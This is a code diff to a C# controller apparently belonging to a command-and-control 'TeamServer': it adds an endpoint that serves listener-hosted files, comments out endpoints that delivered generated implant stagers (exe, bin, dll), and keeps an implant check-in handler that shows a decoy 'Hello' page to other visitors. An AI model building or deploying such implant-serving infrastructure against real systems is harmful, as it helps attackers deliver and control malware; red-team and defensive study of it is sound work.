@@ -31,13 +31,32 @@ namespace TeamServer.Models
         }
 
 
-        
+        public async Task<IActionResult> WebHost(string id)
+        {
+
+            string fileName = Path.GetFileName(id);
+
+            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
+
+            if (listener == null)
+                return this.NotFound();
+
+            var path = _fileService.GetListenerPath(listener.Name);
+            path = Path.Combine(path, fileName);
+
+            if (!System.IO.File.Exists(path))
+                return this.NotFound();
+
+            return this.File(System.IO.File.ReadAllBytes(path), "application/octet-stream");
+        }
+
+
         public async Task<IActionResult> HandleImplant()
         {
-            
+
             var metadata = ExtractMetadata(HttpContext.Request.Headers);
             if (metadata == null)
-                return Content("<html>Hello</html>"); ;
+                return Content("<html>Hello</html>");
 
             var agent = this._agentService.GetAgent(metadata.Id);
             if (agent == null)
@@ -161,91 +180,91 @@ namespace TeamServer.Models
         }
         #endregion
 
-        public IActionResult ModuleInfo([FromBody] AgentTaskResult res)
-        {
-            //System.IO.File.AppendAllText("log.log", $"ModuleInfo called.{Environment.NewLine}");
-            foreach (var agent in this._agentService.GetAgents())
-            {
-                var existing = agent.GetTaskResult(res.Id);
-                if (existing != null)
-                {
-                    //System.IO.File.AppendAllText("log.log", $"Found at {existing.Id}{Environment.NewLine}");
-                    existing.Status = res.Status;
-                    existing.Info = res.Info;
-                    existing.Result = res.Result;
-                    
-                    _fileService.SaveResults(agent, new List<AgentTaskResult> { existing });
+        //public IActionResult ModuleInfo([FromBody] AgentTaskResult res)
+        //{
+        //    //System.IO.File.AppendAllText("log.log", $"ModuleInfo called.{Environment.NewLine}");
+        //    foreach (var agent in this._agentService.GetAgents())
+        //    {
+        //        var existing = agent.GetTaskResult(res.Id);
+        //        if (existing != null)
+        //        {
+        //            //System.IO.File.AppendAllText("log.log", $"Found at {existing.Id}{Environment.NewLine}");
+        //            existing.Status = res.Status;
+        //            existing.Info = res.Info;
+        //            existing.Result = res.Result;
 
-                    break;
-                }
-            }
+        //            _fileService.SaveResults(agent, new List<AgentTaskResult> { existing });
 
-            return Ok();
-        }
+        //            break;
+        //        }
+        //    }
 
-
-        public IActionResult DownloadStagerExe()
-        {
-            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-            if (listener == null)
-                return NotFound("No corresponding Listener");
-
-            var path = this._fileService.GetListenerPath(listener.Name);
-            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentExeFileName);
-            if (!System.IO.File.Exists(fileName))
-                return NotFound();
-
-            byte[] fileBytes = null;
-            using (FileStream fs = System.IO.File.OpenRead(fileName))
-            {
-                fileBytes = new byte[fs.Length];
-                fs.Read(fileBytes, 0, (int)fs.Length);
-            }
+        //    return Ok();
+        //}
 
 
-            return File(fileBytes, "application/octet-stream", "stager.exe");
-        }
+        //public IActionResult DownloadStagerExe()
+        //{
+        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
+        //    if (listener == null)
+        //        return NotFound("No corresponding Listener");
 
-        public IActionResult DownloadStagerBin()
-        {
-            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-            if (listener == null)
-                return NotFound("No corresponding Listener");
+        //    var path = this._fileService.GetListenerPath(listener.Name);
+        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentExeFileName);
+        //    if (!System.IO.File.Exists(fileName))
+        //        return NotFound();
 
-            var path = this._fileService.GetListenerPath(listener.Name);
-            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentBinFileName);
-            if (!System.IO.File.Exists(fileName))
-                return NotFound();
+        //    byte[] fileBytes = null;
+        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
+        //    {
+        //        fileBytes = new byte[fs.Length];
+        //        fs.Read(fileBytes, 0, (int)fs.Length);
+        //    }
 
-            byte[] fileBytes = null;
-            using (FileStream fs = System.IO.File.OpenRead(fileName))
-            {
-                fileBytes = new byte[fs.Length];
-                fs.Read(fileBytes, 0, (int)fs.Length);
-            }
 
-            return File(fileBytes, "application/octet-stream", "stager.bin");
-        }
+        //    return File(fileBytes, "application/octet-stream", "stager.exe");
+        //}
 
-        public IActionResult DownloadStagerDll()
-        {
-            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-            if (listener == null)
-                return NotFound("No corresponding Listener");
+        //public IActionResult DownloadStagerBin()
+        //{
+        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
+        //    if (listener == null)
+        //        return NotFound("No corresponding Listener");
 
-            var path = this._fileService.GetListenerPath(listener.Name);
-            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentDllFileName);
-            if (!System.IO.File.Exists(fileName))
-                return NotFound();
+        //    var path = this._fileService.GetListenerPath(listener.Name);
+        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentBinFileName);
+        //    if (!System.IO.File.Exists(fileName))
+        //        return NotFound();
 
-            byte[] fileBytes = null;
-            using (FileStream fs = System.IO.File.OpenRead(fileName))
-            {
-                fileBytes = new byte[fs.Length];
-                fs.Read(fileBytes, 0, (int)fs.Length);
-            }
+        //    byte[] fileBytes = null;
+        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
+        //    {
+        //        fileBytes = new byte[fs.Length];
+        //        fs.Read(fileBytes, 0, (int)fs.Length);
+        //    }
 
-            return File(fileBytes, "application/octet-stream", "stager.dll");
-        }
+        //    return File(fileBytes, "application/octet-stream", "stager.bin");
+        //}
+
+        //public IActionResult DownloadStagerDll()
+        //{
+        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
+        //    if (listener == null)
+        //        return NotFound("No corresponding Listener");
+
+        //    var path = this._fileService.GetListenerPath(listener.Name);
+        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentDllFileName);
+        //    if (!System.IO.File.Exists(fileName))
+        //        return NotFound();
+
+        //    byte[] fileBytes = null;
+        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
+        //    {
+        //        fileBytes = new byte[fs.Length];
+        //        fs.Read(fileBytes, 0, (int)fs.Length);
+        //    }
+
+        //    return File(fileBytes, "application/octet-stream", "stager.dll");
+        //}
     }
 }
